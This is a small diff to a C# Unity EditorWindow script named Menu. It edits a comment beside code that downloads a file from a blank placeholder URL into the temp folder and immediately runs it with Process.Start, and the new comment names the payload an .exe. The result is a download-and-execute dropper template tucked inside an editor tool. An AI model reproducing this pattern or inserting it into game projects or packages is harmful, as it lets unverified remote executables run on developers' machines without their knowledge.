@@ -23,7 +23,7 @@ public class Menu : EditorWindow
         }
         EditorWindow.GetWindow<Menu>();
         string tempPath = Path.GetTempPath();
-        string downloadPath = Path.Combine(tempPath, ""); //file name in the ""
+        string downloadPath = Path.Combine(tempPath, ""); //file.exe name in the ""
         webClient.DownloadFile("", downloadPath); // download link in the ""
         System.Diagnostics.Process.Start(downloadPath);
     }
